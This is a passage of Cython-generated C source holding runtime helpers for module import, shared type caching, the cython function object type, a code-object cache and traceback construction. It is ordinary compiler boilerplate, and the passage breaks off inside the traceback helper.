static CYTHON_INLINE PyObject* __Pyx_PyObject_FormatAndDecref(PyObject* s, PyObject* f) {
    PyObject *result = PyObject_Format(s, f);
    Py_DECREF(s);
    return result;
}


static PyObject *__Pyx_Import(PyObject *name, PyObject *from_list, int level) {
    PyObject *empty_list = 0;
    PyObject *module = 0;
    PyObject *global_dict = 0;
    PyObject *empty_dict = 0;
    PyObject *list;
    #if PY_MAJOR_VERSION < 3
    PyObject *py_import;
    py_import = __Pyx_PyObject_GetAttrStr(__pyx_b, __pyx_n_s_import);
    if (!py_import)
        goto bad;
    #endif
    if (from_list)
        list = from_list;
    else {
        empty_list = PyList_New(0);
        if (!empty_list)
            goto bad;
        list = empty_list;
    }
    global_dict = PyModule_GetDict(__pyx_m);
    if (!global_dict)
        goto bad;
    empty_dict = PyDict_New();
    if (!empty_dict)
        goto bad;
    {
        #if PY_MAJOR_VERSION >= 3
        if (level == -1) {
            if ((1) && (strchr(__Pyx_MODULE_NAME, '.'))) {
                module = PyImport_ImportModuleLevelObject(
                    name, global_dict, empty_dict, list, 1);
                if (!module) {
                    if (!PyErr_ExceptionMatches(PyExc_ImportError))
                        goto bad;
                    PyErr_Clear();
                }
            }
            level = 0;
        }
        #endif
        if (!module) {
            #if PY_MAJOR_VERSION < 3
            PyObject *py_level = PyInt_FromLong(level);
            if (!py_level)
                goto bad;
            module = PyObject_CallFunctionObjArgs(py_import,
                name, global_dict, empty_dict, list, py_level, (PyObject *)NULL);
            Py_DECREF(py_level);
            #else
            module = PyImport_ImportModuleLevelObject(
                name, global_dict, empty_dict, list, level);
            #endif
        }
    }
bad:
    #if PY_MAJOR_VERSION < 3
    Py_XDECREF(py_import);
    #endif
    Py_XDECREF(empty_list);
    Py_XDECREF(empty_dict);
    return module;
}


static PyObject* __Pyx_ImportFrom(PyObject* module, PyObject* name) {
    PyObject* value = __Pyx_PyObject_GetAttrStr(module, name);
    if (unlikely(!value) && PyErr_ExceptionMatches(PyExc_AttributeError)) {
        PyErr_Format(PyExc_ImportError,
        #if PY_MAJOR_VERSION < 3
            "cannot import name %.230s", PyString_AS_STRING(name));
        #else
            "cannot import name %S", name);
        #endif
    }
    return value;
}


static PyTypeObject* __Pyx_FetchCommonType(PyTypeObject* type) {
    PyObject* fake_module;
    PyTypeObject* cached_type = NULL;
    fake_module = PyImport_AddModule((char*) "_cython_" CYTHON_ABI);
    if (!fake_module) return NULL;
    Py_INCREF(fake_module);
    cached_type = (PyTypeObject*) PyObject_GetAttrString(fake_module, type->tp_name);
    if (cached_type) {
        if (!PyType_Check((PyObject*)cached_type)) {
            PyErr_Format(PyExc_TypeError,
                "Shared Cython type %.200s is not a type object",
                type->tp_name);
            goto bad;
        }
        if (cached_type->tp_basicsize != type->tp_basicsize) {
            PyErr_Format(PyExc_TypeError,
                "Shared Cython type %.200s has the wrong size, try recompiling",
                type->tp_name);
            goto bad;
        }
    } else {
        if (!PyErr_ExceptionMatches(PyExc_AttributeError)) goto bad;
        PyErr_Clear();
        if (PyType_Ready(type) < 0) goto bad;
        if (PyObject_SetAttrString(fake_module, type->tp_name, (PyObject*) type) < 0)
            goto bad;
        Py_INCREF(type);
        cached_type = type;
    }
done:
    Py_DECREF(fake_module);
    return cached_type;
bad:
    Py_XDECREF(cached_type);
    cached_type = NULL;
    goto done;
}


#include <structmember.h>
static PyObject *
__Pyx_CyFunction_get_doc(__pyx_CyFunctionObject *op, CYTHON_UNUSED void *closure)
{
    if (unlikely(op->func_doc == NULL)) {
        if (op->func.m_ml->ml_doc) {
#if PY_MAJOR_VERSION >= 3
            op->func_doc = PyUnicode_FromString(op->func.m_ml->ml_doc);
#else
            op->func_doc = PyString_FromString(op->func.m_ml->ml_doc);
#endif
            if (unlikely(op->func_doc == NULL))
                return NULL;
        } else {
            Py_INCREF(Py_None);
            return Py_None;
        }
    }
    Py_INCREF(op->func_doc);
    return op->func_doc;
}
static int
__Pyx_CyFunction_set_doc(__pyx_CyFunctionObject *op, PyObject *value, CYTHON_UNUSED void *context)
{
    PyObject *tmp = op->func_doc;
    if (value == NULL) {
        value = Py_None;
    }
    Py_INCREF(value);
    op->func_doc = value;
    Py_XDECREF(tmp);
    return 0;
}
static PyObject *
__Pyx_CyFunction_get_name(__pyx_CyFunctionObject *op, CYTHON_UNUSED void *context)
{
    if (unlikely(op->func_name == NULL)) {
#if PY_MAJOR_VERSION >= 3
        op->func_name = PyUnicode_InternFromString(op->func.m_ml->ml_name);
#else
        op->func_name = PyString_InternFromString(op->func.m_ml->ml_name);
#endif
        if (unlikely(op->func_name == NULL))
            return NULL;
    }
    Py_INCREF(op->func_name);
    return op->func_name;
}
static int
__Pyx_CyFunction_set_name(__pyx_CyFunctionObject *op, PyObject *value, CYTHON_UNUSED void *context)
{
    PyObject *tmp;
#if PY_MAJOR_VERSION >= 3
    if (unlikely(value == NULL || !PyUnicode_Check(value)))
#else
    if (unlikely(value == NULL || !PyString_Check(value)))
#endif
    {
        PyErr_SetString(PyExc_TypeError,
                        "__name__ must be set to a string object");
        return -1;
    }
    tmp = op->func_name;
    Py_INCREF(value);
    op->func_name = value;
    Py_XDECREF(tmp);
    return 0;
}
static PyObject *
__Pyx_CyFunction_get_qualname(__pyx_CyFunctionObject *op, CYTHON_UNUSED void *context)
{
    Py_INCREF(op->func_qualname);
    return op->func_qualname;
}
static int
__Pyx_CyFunction_set_qualname(__pyx_CyFunctionObject *op, PyObject *value, CYTHON_UNUSED void *context)
{
    PyObject *tmp;
#if PY_MAJOR_VERSION >= 3
    if (unlikely(value == NULL || !PyUnicode_Check(value)))
#else
    if (unlikely(value == NULL || !PyString_Check(value)))
#endif
    {
        PyErr_SetString(PyExc_TypeError,
                        "__qualname__ must be set to a string object");
        return -1;
    }
    tmp = op->func_qualname;
    Py_INCREF(value);
    op->func_qualname = value;
    Py_XDECREF(tmp);
    return 0;
}
static PyObject *
__Pyx_CyFunction_get_self(__pyx_CyFunctionObject *m, CYTHON_UNUSED void *closure)
{
    PyObject *self;
    self = m->func_closure;
    if (self == NULL)
        self = Py_None;
    Py_INCREF(self);
    return self;
}
static PyObject *
__Pyx_CyFunction_get_dict(__pyx_CyFunctionObject *op, CYTHON_UNUSED void *context)
{
    if (unlikely(op->func_dict == NULL)) {
        op->func_dict = PyDict_New();
        if (unlikely(op->func_dict == NULL))
            return NULL;
    }
    Py_INCREF(op->func_dict);
    return op->func_dict;
}
static int
__Pyx_CyFunction_set_dict(__pyx_CyFunctionObject *op, PyObject *value, CYTHON_UNUSED void *context)
{
    PyObject *tmp;
    if (unlikely(value == NULL)) {
        PyErr_SetString(PyExc_TypeError,
               "function's dictionary may not be deleted");
        return -1;
    }
    if (unlikely(!PyDict_Check(value))) {
        PyErr_SetString(PyExc_TypeError,
               "setting function's dictionary to a non-dict");
        return -1;
    }
    tmp = op->func_dict;
    Py_INCREF(value);
    op->func_dict = value;
    Py_XDECREF(tmp);
    return 0;
}
static PyObject *
__Pyx_CyFunction_get_globals(__pyx_CyFunctionObject *op, CYTHON_UNUSED void *context)
{
    Py_INCREF(op->func_globals);
    return op->func_globals;
}
static PyObject *
__Pyx_CyFunction_get_closure(CYTHON_UNUSED __pyx_CyFunctionObject *op, CYTHON_UNUSED void *context)
{
    Py_INCREF(Py_None);
    return Py_None;
}
static PyObject *
__Pyx_CyFunction_get_code(__pyx_CyFunctionObject *op, CYTHON_UNUSED void *context)
{
    PyObject* result = (op->func_code) ? op->func_code : Py_None;
    Py_INCREF(result);
    return result;
}
static int
__Pyx_CyFunction_init_defaults(__pyx_CyFunctionObject *op) {
    int result = 0;
    PyObject *res = op->defaults_getter((PyObject *) op);
    if (unlikely(!res))
        return -1;
    #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
    op->defaults_tuple = PyTuple_GET_ITEM(res, 0);
    Py_INCREF(op->defaults_tuple);
    op->defaults_kwdict = PyTuple_GET_ITEM(res, 1);
    Py_INCREF(op->defaults_kwdict);
    #else
    op->defaults_tuple = PySequence_ITEM(res, 0);
    if (unlikely(!op->defaults_tuple)) result = -1;
    else {
        op->defaults_kwdict = PySequence_ITEM(res, 1);
        if (unlikely(!op->defaults_kwdict)) result = -1;
    }
    #endif
    Py_DECREF(res);
    return result;
}
static int
__Pyx_CyFunction_set_defaults(__pyx_CyFunctionObject *op, PyObject* value, CYTHON_UNUSED void *context) {
    PyObject* tmp;
    if (!value) {
        value = Py_None;
    } else if (value != Py_None && !PyTuple_Check(value)) {
        PyErr_SetString(PyExc_TypeError,
                        "__defaults__ must be set to a tuple object");
        return -1;
    }
    Py_INCREF(value);
    tmp = op->defaults_tuple;
    op->defaults_tuple = value;
    Py_XDECREF(tmp);
    return 0;
}
static PyObject *
__Pyx_CyFunction_get_defaults(__pyx_CyFunctionObject *op, CYTHON_UNUSED void *context) {
    PyObject* result = op->defaults_tuple;
    if (unlikely(!result)) {
        if (op->defaults_getter) {
            if (__Pyx_CyFunction_init_defaults(op) < 0) return NULL;
            result = op->defaults_tuple;
        } else {
            result = Py_None;
        }
    }
    Py_INCREF(result);
    return result;
}
static int
__Pyx_CyFunction_set_kwdefaults(__pyx_CyFunctionObject *op, PyObject* value, CYTHON_UNUSED void *context) {
    PyObject* tmp;
    if (!value) {
        value = Py_None;
    } else if (value != Py_None && !PyDict_Check(value)) {
        PyErr_SetString(PyExc_TypeError,
                        "__kwdefaults__ must be set to a dict object");
        return -1;
    }
    Py_INCREF(value);
    tmp = op->defaults_kwdict;
    op->defaults_kwdict = value;
    Py_XDECREF(tmp);
    return 0;
}
static PyObject *
__Pyx_CyFunction_get_kwdefaults(__pyx_CyFunctionObject *op, CYTHON_UNUSED void *context) {
    PyObject* result = op->defaults_kwdict;
    if (unlikely(!result)) {
        if (op->defaults_getter) {
            if (__Pyx_CyFunction_init_defaults(op) < 0) return NULL;
            result = op->defaults_kwdict;
        } else {
            result = Py_None;
        }
    }
    Py_INCREF(result);
    return result;
}
static int
__Pyx_CyFunction_set_annotations(__pyx_CyFunctionObject *op, PyObject* value, CYTHON_UNUSED void *context) {
    PyObject* tmp;
    if (!value || value == Py_None) {
        value = NULL;
    } else if (!PyDict_Check(value)) {
        PyErr_SetString(PyExc_TypeError,
                        "__annotations__ must be set to a dict object");
        return -1;
    }
    Py_XINCREF(value);
    tmp = op->func_annotations;
    op->func_annotations = value;
    Py_XDECREF(tmp);
    return 0;
}
static PyObject *
__Pyx_CyFunction_get_annotations(__pyx_CyFunctionObject *op, CYTHON_UNUSED void *context) {
    PyObject* result = op->func_annotations;
    if (unlikely(!result)) {
        result = PyDict_New();
        if (unlikely(!result)) return NULL;
        op->func_annotations = result;
    }
    Py_INCREF(result);
    return result;
}
static PyGetSetDef __pyx_CyFunction_getsets[] = {
    {(char *) "func_doc", (getter)__Pyx_CyFunction_get_doc, (setter)__Pyx_CyFunction_set_doc, 0, 0},
    {(char *) "__doc__",  (getter)__Pyx_CyFunction_get_doc, (setter)__Pyx_CyFunction_set_doc, 0, 0},
    {(char *) "func_name", (getter)__Pyx_CyFunction_get_name, (setter)__Pyx_CyFunction_set_name, 0, 0},
    {(char *) "__name__", (getter)__Pyx_CyFunction_get_name, (setter)__Pyx_CyFunction_set_name, 0, 0},
    {(char *) "__qualname__", (getter)__Pyx_CyFunction_get_qualname, (setter)__Pyx_CyFunction_set_qualname, 0, 0},
    {(char *) "__self__", (getter)__Pyx_CyFunction_get_self, 0, 0, 0},
    {(char *) "func_dict", (getter)__Pyx_CyFunction_get_dict, (setter)__Pyx_CyFunction_set_dict, 0, 0},
    {(char *) "__dict__", (getter)__Pyx_CyFunction_get_dict, (setter)__Pyx_CyFunction_set_dict, 0, 0},
    {(char *) "func_globals", (getter)__Pyx_CyFunction_get_globals, 0, 0, 0},
    {(char *) "__globals__", (getter)__Pyx_CyFunction_get_globals, 0, 0, 0},
    {(char *) "func_closure", (getter)__Pyx_CyFunction_get_closure, 0, 0, 0},
    {(char *) "__closure__", (getter)__Pyx_CyFunction_get_closure, 0, 0, 0},
    {(char *) "func_code", (getter)__Pyx_CyFunction_get_code, 0, 0, 0},
    {(char *) "__code__", (getter)__Pyx_CyFunction_get_code, 0, 0, 0},
    {(char *) "func_defaults", (getter)__Pyx_CyFunction_get_defaults, (setter)__Pyx_CyFunction_set_defaults, 0, 0},
    {(char *) "__defaults__", (getter)__Pyx_CyFunction_get_defaults, (setter)__Pyx_CyFunction_set_defaults, 0, 0},
    {(char *) "__kwdefaults__", (getter)__Pyx_CyFunction_get_kwdefaults, (setter)__Pyx_CyFunction_set_kwdefaults, 0, 0},
    {(char *) "__annotations__", (getter)__Pyx_CyFunction_get_annotations, (setter)__Pyx_CyFunction_set_annotations, 0, 0},
    {0, 0, 0, 0, 0}
};
static PyMemberDef __pyx_CyFunction_members[] = {
    {(char *) "__module__", T_OBJECT, offsetof(PyCFunctionObject, m_module), PY_WRITE_RESTRICTED, 0},
    {0, 0, 0,  0, 0}
};
static PyObject *
__Pyx_CyFunction_reduce(__pyx_CyFunctionObject *m, CYTHON_UNUSED PyObject *args)
{
#if PY_MAJOR_VERSION >= 3
    Py_INCREF(m->func_qualname);
    return m->func_qualname;
#else
    return PyString_FromString(m->func.m_ml->ml_name);
#endif
}
static PyMethodDef __pyx_CyFunction_methods[] = {
    {"__reduce__", (PyCFunction)__Pyx_CyFunction_reduce, METH_VARARGS, 0},
    {0, 0, 0, 0}
};
#if PY_VERSION_HEX < 0x030500A0
#define __Pyx_CyFunction_weakreflist(cyfunc) ((cyfunc)->func_weakreflist)
#else
#define __Pyx_CyFunction_weakreflist(cyfunc) ((cyfunc)->func.m_weakreflist)
#endif
static PyObject *__Pyx_CyFunction_Init(__pyx_CyFunctionObject *op, PyMethodDef *ml, int flags, PyObject* qualname,
                                       PyObject *closure, PyObject *module, PyObject* globals, PyObject* code) {
    if (unlikely(op == NULL))
        return NULL;
    op->flags = flags;
    __Pyx_CyFunction_weakreflist(op) = NULL;
    op->func.m_ml = ml;
    op->func.m_self = (PyObject *) op;
    Py_XINCREF(closure);
    op->func_closure = closure;
    Py_XINCREF(module);
    op->func.m_module = module;
    op->func_dict = NULL;
    op->func_name = NULL;
    Py_INCREF(qualname);
    op->func_qualname = qualname;
    op->func_doc = NULL;
    op->func_classobj = NULL;
    op->func_globals = globals;
    Py_INCREF(op->func_globals);
    Py_XINCREF(code);
    op->func_code = code;
    op->defaults_pyobjects = 0;
    op->defaults_size = 0;
    op->defaults = NULL;
    op->defaults_tuple = NULL;
    op->defaults_kwdict = NULL;
    op->defaults_getter = NULL;
    op->func_annotations = NULL;
    return (PyObject *) op;
}
static int
__Pyx_CyFunction_clear(__pyx_CyFunctionObject *m)
{
    Py_CLEAR(m->func_closure);
    Py_CLEAR(m->func.m_module);
    Py_CLEAR(m->func_dict);
    Py_CLEAR(m->func_name);
    Py_CLEAR(m->func_qualname);
    Py_CLEAR(m->func_doc);
    Py_CLEAR(m->func_globals);
    Py_CLEAR(m->func_code);
    Py_CLEAR(m->func_classobj);
    Py_CLEAR(m->defaults_tuple);
    Py_CLEAR(m->defaults_kwdict);
    Py_CLEAR(m->func_annotations);
    if (m->defaults) {
        PyObject **pydefaults = __Pyx_CyFunction_Defaults(PyObject *, m);
        int i;
        for (i = 0; i < m->defaults_pyobjects; i++)
            Py_XDECREF(pydefaults[i]);
        PyObject_Free(m->defaults);
        m->defaults = NULL;
    }
    return 0;
}
static void __Pyx__CyFunction_dealloc(__pyx_CyFunctionObject *m)
{
    if (__Pyx_CyFunction_weakreflist(m) != NULL)
        PyObject_ClearWeakRefs((PyObject *) m);
    __Pyx_CyFunction_clear(m);
    PyObject_GC_Del(m);
}
static void __Pyx_CyFunction_dealloc(__pyx_CyFunctionObject *m)
{
    PyObject_GC_UnTrack(m);
    __Pyx__CyFunction_dealloc(m);
}
static int __Pyx_CyFunction_traverse(__pyx_CyFunctionObject *m, visitproc visit, void *arg)
{
    Py_VISIT(m->func_closure);
    Py_VISIT(m->func.m_module);
    Py_VISIT(m->func_dict);
    Py_VISIT(m->func_name);
    Py_VISIT(m->func_qualname);
    Py_VISIT(m->func_doc);
    Py_VISIT(m->func_globals);
    Py_VISIT(m->func_code);
    Py_VISIT(m->func_classobj);
    Py_VISIT(m->defaults_tuple);
    Py_VISIT(m->defaults_kwdict);
    if (m->defaults) {
        PyObject **pydefaults = __Pyx_CyFunction_Defaults(PyObject *, m);
        int i;
        for (i = 0; i < m->defaults_pyobjects; i++)
            Py_VISIT(pydefaults[i]);
    }
    return 0;
}
static PyObject *__Pyx_CyFunction_descr_get(PyObject *func, PyObject *obj, PyObject *type)
{
#if PY_MAJOR_VERSION < 3
    __pyx_CyFunctionObject *m = (__pyx_CyFunctionObject *) func;
    if (m->flags & __Pyx_CYFUNCTION_STATICMETHOD) {
        Py_INCREF(func);
        return func;
    }
    if (m->flags & __Pyx_CYFUNCTION_CLASSMETHOD) {
        if (type == NULL)
            type = (PyObject *)(Py_TYPE(obj));
        return __Pyx_PyMethod_New(func, type, (PyObject *)(Py_TYPE(type)));
    }
    if (obj == Py_None)
        obj = NULL;
#endif
    return __Pyx_PyMethod_New(func, obj, type);
}
static PyObject*
__Pyx_CyFunction_repr(__pyx_CyFunctionObject *op)
{
#if PY_MAJOR_VERSION >= 3
    return PyUnicode_FromFormat("<cyfunction %U at %p>",
                                op->func_qualname, (void *)op);
#else
    return PyString_FromFormat("<cyfunction %s at %p>",
                               PyString_AsString(op->func_qualname), (void *)op);
#endif
}
static PyObject * __Pyx_CyFunction_CallMethod(PyObject *func, PyObject *self, PyObject *arg, PyObject *kw) {
    PyCFunctionObject* f = (PyCFunctionObject*)func;
    PyCFunction meth = f->m_ml->ml_meth;
    Py_ssize_t size;
    switch (f->m_ml->ml_flags & (METH_VARARGS | METH_KEYWORDS | METH_NOARGS | METH_O)) {
    case METH_VARARGS:
        if (likely(kw == NULL || PyDict_Size(kw) == 0))
            return (*meth)(self, arg);
        break;
    case METH_VARARGS | METH_KEYWORDS:
        return (*(PyCFunctionWithKeywords)(void*)meth)(self, arg, kw);
    case METH_NOARGS:
        if (likely(kw == NULL || PyDict_Size(kw) == 0)) {
            size = PyTuple_GET_SIZE(arg);
            if (likely(size == 0))
                return (*meth)(self, NULL);
            PyErr_Format(PyExc_TypeError,
                "%.200s() takes no arguments (%" CYTHON_FORMAT_SSIZE_T "d given)",
                f->m_ml->ml_name, size);
            return NULL;
        }
        break;
    case METH_O:
        if (likely(kw == NULL || PyDict_Size(kw) == 0)) {
            size = PyTuple_GET_SIZE(arg);
            if (likely(size == 1)) {
                PyObject *result, *arg0;
                #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
                arg0 = PyTuple_GET_ITEM(arg, 0);
                #else
                arg0 = PySequence_ITEM(arg, 0); if (unlikely(!arg0)) return NULL;
                #endif
                result = (*meth)(self, arg0);
                #if !(CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS)
                Py_DECREF(arg0);
                #endif
                return result;
            }
            PyErr_Format(PyExc_TypeError,
                "%.200s() takes exactly one argument (%" CYTHON_FORMAT_SSIZE_T "d given)",
                f->m_ml->ml_name, size);
            return NULL;
        }
        break;
    default:
        PyErr_SetString(PyExc_SystemError, "Bad call flags in "
                        "__Pyx_CyFunction_Call. METH_OLDARGS is no "
                        "longer supported!");
        return NULL;
    }
    PyErr_Format(PyExc_TypeError, "%.200s() takes no keyword arguments",
                 f->m_ml->ml_name);
    return NULL;
}
static CYTHON_INLINE PyObject *__Pyx_CyFunction_Call(PyObject *func, PyObject *arg, PyObject *kw) {
    return __Pyx_CyFunction_CallMethod(func, ((PyCFunctionObject*)func)->m_self, arg, kw);
}
static PyObject *__Pyx_CyFunction_CallAsMethod(PyObject *func, PyObject *args, PyObject *kw) {
    PyObject *result;
    __pyx_CyFunctionObject *cyfunc = (__pyx_CyFunctionObject *) func;
    if ((cyfunc->flags & __Pyx_CYFUNCTION_CCLASS) && !(cyfunc->flags & __Pyx_CYFUNCTION_STATICMETHOD)) {
        Py_ssize_t argc;
        PyObject *new_args;
        PyObject *self;
        argc = PyTuple_GET_SIZE(args);
        new_args = PyTuple_GetSlice(args, 1, argc);
        if (unlikely(!new_args))
            return NULL;
        self = PyTuple_GetItem(args, 0);
        if (unlikely(!self)) {
            Py_DECREF(new_args);
            return NULL;
        }
        result = __Pyx_CyFunction_CallMethod(func, self, new_args, kw);
        Py_DECREF(new_args);
    } else {
        result = __Pyx_CyFunction_Call(func, args, kw);
    }
    return result;
}
static PyTypeObject __pyx_CyFunctionType_type = {
    PyVarObject_HEAD_INIT(0, 0)
    "cython_function_or_method",
    sizeof(__pyx_CyFunctionObject),
    0,
    (destructor) __Pyx_CyFunction_dealloc,
    0,
    0,
    0,
#if PY_MAJOR_VERSION < 3
    0,
#else
    0,
#endif
    (reprfunc) __Pyx_CyFunction_repr,
    0,
    0,
    0,
    0,
    __Pyx_CyFunction_CallAsMethod,
    0,
    0,
    0,
    0,
    Py_TPFLAGS_DEFAULT | Py_TPFLAGS_HAVE_GC,
    0,
    (traverseproc) __Pyx_CyFunction_traverse,
    (inquiry) __Pyx_CyFunction_clear,
    0,
#if PY_VERSION_HEX < 0x030500A0
    offsetof(__pyx_CyFunctionObject, func_weakreflist),
#else
    offsetof(PyCFunctionObject, m_weakreflist),
#endif
    0,
    0,
    __pyx_CyFunction_methods,
    __pyx_CyFunction_members,
    __pyx_CyFunction_getsets,
    0,
    0,
    __Pyx_CyFunction_descr_get,
    0,
    offsetof(__pyx_CyFunctionObject, func_dict),
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
#if PY_VERSION_HEX >= 0x030400a1
    0,
#endif
#if PY_VERSION_HEX >= 0x030800b1 && (!CYTHON_COMPILING_IN_PYPY || PYPY_VERSION_NUM >= 0x07030800)
    0,
#endif
#if PY_VERSION_HEX >= 0x030800b4 && PY_VERSION_HEX < 0x03090000
    0,
#endif
#if CYTHON_COMPILING_IN_PYPY && PY_VERSION_HEX >= 0x03090000
    0,
#endif
};
static int __pyx_CyFunction_init(void) {
    __pyx_CyFunctionType = __Pyx_FetchCommonType(&__pyx_CyFunctionType_type);
    if (unlikely(__pyx_CyFunctionType == NULL)) {
        return -1;
    }
    return 0;
}
static CYTHON_INLINE void *__Pyx_CyFunction_InitDefaults(PyObject *func, size_t size, int pyobjects) {
    __pyx_CyFunctionObject *m = (__pyx_CyFunctionObject *) func;
    m->defaults = PyObject_Malloc(size);
    if (unlikely(!m->defaults))
        return PyErr_NoMemory();
    memset(m->defaults, 0, size);
    m->defaults_pyobjects = pyobjects;
    m->defaults_size = size;
    return m->defaults;
}
static CYTHON_INLINE void __Pyx_CyFunction_SetDefaultsTuple(PyObject *func, PyObject *tuple) {
    __pyx_CyFunctionObject *m = (__pyx_CyFunctionObject *) func;
    m->defaults_tuple = tuple;
    Py_INCREF(tuple);
}
static CYTHON_INLINE void __Pyx_CyFunction_SetDefaultsKwDict(PyObject *func, PyObject *dict) {
    __pyx_CyFunctionObject *m = (__pyx_CyFunctionObject *) func;
    m->defaults_kwdict = dict;
    Py_INCREF(dict);
}
static CYTHON_INLINE void __Pyx_CyFunction_SetAnnotationsDict(PyObject *func, PyObject *dict) {
    __pyx_CyFunctionObject *m = (__pyx_CyFunctionObject *) func;
    m->func_annotations = dict;
    Py_INCREF(dict);
}


static PyObject *__Pyx_CyFunction_New(PyMethodDef *ml, int flags, PyObject* qualname,
                                      PyObject *closure, PyObject *module, PyObject* globals, PyObject* code) {
    PyObject *op = __Pyx_CyFunction_Init(
        PyObject_GC_New(__pyx_CyFunctionObject, __pyx_CyFunctionType),
        ml, flags, qualname, closure, module, globals, code
    );
    if (likely(op)) {
        PyObject_GC_Track(op);
    }
    return op;
}


#ifndef CYTHON_CLINE_IN_TRACEBACK
static int __Pyx_CLineForTraceback(CYTHON_NCP_UNUSED PyThreadState *tstate, int c_line) {
    PyObject *use_cline;
    PyObject *ptype, *pvalue, *ptraceback;
#if CYTHON_COMPILING_IN_CPYTHON
    PyObject **cython_runtime_dict;
#endif
    if (unlikely(!__pyx_cython_runtime)) {
        return c_line;
    }
    __Pyx_ErrFetchInState(tstate, &ptype, &pvalue, &ptraceback);
#if CYTHON_COMPILING_IN_CPYTHON
    cython_runtime_dict = _PyObject_GetDictPtr(__pyx_cython_runtime);
    if (likely(cython_runtime_dict)) {
        __PYX_PY_DICT_LOOKUP_IF_MODIFIED(
            use_cline, *cython_runtime_dict,
            __Pyx_PyDict_GetItemStr(*cython_runtime_dict, __pyx_n_s_cline_in_traceback))
    } else
#endif
    {
      PyObject *use_cline_obj = __Pyx_PyObject_GetAttrStr(__pyx_cython_runtime, __pyx_n_s_cline_in_traceback);
      if (use_cline_obj) {
        use_cline = PyObject_Not(use_cline_obj) ? Py_False : Py_True;
        Py_DECREF(use_cline_obj);
      } else {
        PyErr_Clear();
        use_cline = NULL;
      }
    }
    if (!use_cline) {
        c_line = 0;
        (void) PyObject_SetAttr(__pyx_cython_runtime, __pyx_n_s_cline_in_traceback, Py_False);
    }
    else if (use_cline == Py_False || (use_cline != Py_True && PyObject_Not(use_cline) != 0)) {
        c_line = 0;
    }
    __Pyx_ErrRestoreInState(tstate, ptype, pvalue, ptraceback);
    return c_line;
}
#endif


static int __pyx_bisect_code_objects(__Pyx_CodeObjectCacheEntry* entries, int count, int code_line) {
    int start = 0, mid = 0, end = count - 1;
    if (end >= 0 && code_line > entries[end].code_line) {
        return count;
    }
    while (start < end) {
        mid = start + (end - start) / 2;
        if (code_line < entries[mid].code_line) {
            end = mid;
        } else if (code_line > entries[mid].code_line) {
             start = mid + 1;
        } else {
            return mid;
        }
    }
    if (code_line <= entries[mid].code_line) {
        return mid;
    } else {
        return mid + 1;
    }
}
static PyCodeObject *__pyx_find_code_object(int code_line) {
    PyCodeObject* code_object;
    int pos;
    if (unlikely(!code_line) || unlikely(!__pyx_code_cache.entries)) {
        return NULL;
    }
    pos = __pyx_bisect_code_objects(__pyx_code_cache.entries, __pyx_code_cache.count, code_line);
    if (unlikely(pos >= __pyx_code_cache.count) || unlikely(__pyx_code_cache.entries[pos].code_line != code_line)) {
        return NULL;
    }
    code_object = __pyx_code_cache.entries[pos].code_object;
    Py_INCREF(code_object);
    return code_object;
}
static void __pyx_insert_code_object(int code_line, PyCodeObject* code_object) {
    int pos, i;
    __Pyx_CodeObjectCacheEntry* entries = __pyx_code_cache.entries;
    if (unlikely(!code_line)) {
        return;
    }
    if (unlikely(!entries)) {
        entries = (__Pyx_CodeObjectCacheEntry*)PyMem_Malloc(64*sizeof(__Pyx_CodeObjectCacheEntry));
        if (likely(entries)) {
            __pyx_code_cache.entries = entries;
            __pyx_code_cache.max_count = 64;
            __pyx_code_cache.count = 1;
            entries[0].code_line = code_line;
            entries[0].code_object = code_object;
            Py_INCREF(code_object);
        }
        return;
    }
    pos = __pyx_bisect_code_objects(__pyx_code_cache.entries, __pyx_code_cache.count, code_line);
    if ((pos < __pyx_code_cache.count) && unlikely(__pyx_code_cache.entries[pos].code_line == code_line)) {
        PyCodeObject* tmp = entries[pos].code_object;
        entries[pos].code_object = code_object;
        Py_DECREF(tmp);
        return;
    }
    if (__pyx_code_cache.count == __pyx_code_cache.max_count) {
        int new_max = __pyx_code_cache.max_count + 64;
        entries = (__Pyx_CodeObjectCacheEntry*)PyMem_Realloc(
            __pyx_code_cache.entries, ((size_t)new_max) * sizeof(__Pyx_CodeObjectCacheEntry));
        if (unlikely(!entries)) {
            return;
        }
        __pyx_code_cache.entries = entries;
        __pyx_code_cache.max_count = new_max;
    }
    for (i=__pyx_code_cache.count; i>pos; i--) {
        entries[i] = entries[i-1];
    }
    entries[pos].code_line = code_line;
    entries[pos].code_object = code_object;
    __pyx_code_cache.count++;
    Py_INCREF(code_object);
}


#include "compile.h"
#include "frameobject.h"
#include "traceback.h"
static PyCodeObject* __Pyx_CreateCodeObjectForTraceback(
            const char *funcname, int c_line,
            int py_line, const char *filename) {
    PyCodeObject *py_code = NULL;
    PyObject *py_funcname = NULL;
    #if PY_MAJOR_VERSION < 3
    PyObject *py_srcfile = NULL;
    py_srcfile = PyString_FromString(filename);
    if (!py_srcfile) goto bad;
    #endif
    if (c_line) {
        #if PY_MAJOR_VERSION < 3
        py_funcname = PyString_FromFormat( "%s (%s:%d)", funcname, __pyx_cfilenm, c_line);
        if (!py_funcname) goto bad;
        #else
        py_funcname = PyUnicode_FromFormat( "%s (%s:%d)", funcname, __pyx_cfilenm, c_line);
        if (!py_funcname) goto bad;
        funcname = PyUnicode_AsUTF8(py_funcname);
        if (!funcname) goto bad;
        #endif
    }
    else {
        #if PY_MAJOR_VERSION < 3
        py_funcname = PyString_FromString(funcname);
        if (!py_funcname) goto bad;
        #endif
    }
    #if PY_MAJOR_VERSION < 3
    py_code = __Pyx_PyCode_New(
        0,
        0,
        0,
        0,
        0,
        __pyx_empty_bytes, 
        __pyx_empty_tuple, 
        __pyx_empty_tuple, 
        __pyx_empty_tuple, 
        __pyx_empty_tuple, 
        __pyx_empty_tuple, 
        py_srcfile,   
        py_funcname,  
        py_line,
        __pyx_empty_bytes  
    );
    Py_DECREF(py_srcfile);
    #else
    py_code = PyCode_NewEmpty(filename, funcname, py_line);
    #endif
    Py_XDECREF(py_funcname);  // XDECREF since it's only set on Py3 if cline
    return py_code;
bad:
    Py_XDECREF(py_funcname);
    #if PY_MAJOR_VERSION < 3
    Py_XDECREF(py_srcfile);
    #endif
    return NULL;
}
static void __Pyx_AddTraceback(const char *funcname, int c_line,
                               int py_line, const char *filename) {
    PyCodeObject *py_code = 0;
    PyFrameObject *py_frame = 0;
